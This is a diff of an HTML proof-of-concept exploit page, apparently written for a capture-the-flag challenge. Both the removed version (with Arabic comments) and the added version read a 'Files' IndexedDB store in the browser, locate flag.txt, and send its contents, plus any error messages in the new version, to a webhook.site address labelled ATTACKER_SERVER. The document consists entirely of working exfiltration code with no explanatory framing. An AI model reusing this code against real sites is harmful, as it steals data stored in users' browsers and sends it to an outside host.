@@ -1,32 +1,77 @@
-<!doctype html>
-<meta charset="utf-8">
-<title>PoC – read IndexedDB</title>
-<script>
-(async () => {
-  // ❶ افتح IndexedDB "Files"
-  const db = await new Promise(r => {
-    const req = indexedDB.open('Files',1);
-    req.onsuccess = ()=>r(req.result);
-  });
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Pwned</title>
+</head>
+<body>
+  <h1>Working...</h1>
+  <script>
+    // URL to send the flag to. Use a service like requestcatcher.com or your own server.
+    const ATTACKER_SERVER = "https://webhook.site/dd1b22f1-4217-44e2-a142-ce1825ed0b23";
 
-  // ❷ جلب كل السجلات من objectStore "files"
-  const filesOS = db.transaction('files','readonly').objectStore('files');
-  const all = await new Promise(r => {
-    const g = filesOS.getAll(); g.onsuccess = ()=>r(g.result);
-  });
+    // Re-implementation of the necessary parts of db.js
+    class DB {
+      constructor() {
+        const dbrequest = indexedDB.open("Files", 1);
+        this.dbPromise = new Promise((resolve, reject) => {
+          dbrequest.onsuccess = () => resolve(dbrequest.result);
+          dbrequest.onerror = () => reject("Error opening DB");
+        });
+      }
 
-  // ❸ ابحث عن ملف نصي (أو اسمه flag.txt)
-  const rec = all.find(f => f.file?.name === 'flag.txt')
-            || all.find(f => f.file?.type === 'text/plain')
-            || all[0];                       // fallback
+      async getFilesInfo() {
+        const db = await this.dbPromise;
+        const info_store = db.transaction("info", "readonly").objectStore("info");
+        const req = info_store.getAll();
+        return new Promise((resolve) => {
+          req.onsuccess = () => resolve(req.result);
+        });
+      }
 
-  if(!rec){ return; }                        // فشل
+      async getFileBlob(id) {
+        const db = await this.dbPromise;
+        const files_store = db.transaction("files", "readonly").objectStore("files");
+        const req = files_store.get(id);
+        return new Promise((resolve) => {
+          req.onsuccess = () => resolve(req.result.file); // We only need the blob
+        });
+      }
+    }
 
-  const flag = await rec.file.text();
+    async function exfiltrateFlag() {
+      try {
+        const db = new DB();
 
-  // ❹ هرّب العلم
-  fetch('https://webhook.site/dd1b22f1-4217-44e2-a142-ce1825ed0b23?flag=' +
-        encodeURIComponent(flag));
+        // 1. Get all file metadata
+        const allFilesInfo = await db.getFilesInfo();
 
-})();
-</script>
+        // 2. Find the flag.txt file info
+        const flagInfo = allFilesInfo.find(f => f.name === "flag.txt");
+        if (!flagInfo) {
+          console.error("Flag file not found in DB.");
+          return;
+        }
+        
+        // 3. Get the flag Blob using its ID
+        const flagId = flagInfo.id;
+        const flagBlob = await db.getFileBlob(flagId);
+
+        // 4. Read the Blob as text
+        const flagText = await flagBlob.text();
+        console.log("SUCCESS! Flag found:", flagText);
+
+        // 5. Send the flag to our server
+        fetch(`${ATTACKER_SERVER}?flag=${encodeURIComponent(flagText)}`);
+
+      } catch (e) {
+        console.error("Exploit failed:", e);
+        fetch(`${ATTACKER_SERVER}?error=${encodeURIComponent(e.toString())}`);
+      }
+    }
+
+    // Run the exploit after a small delay to ensure DB is populated
+    setTimeout(exfiltrateFlag, 2000);
+
+  </script>
+</body>
+</html>
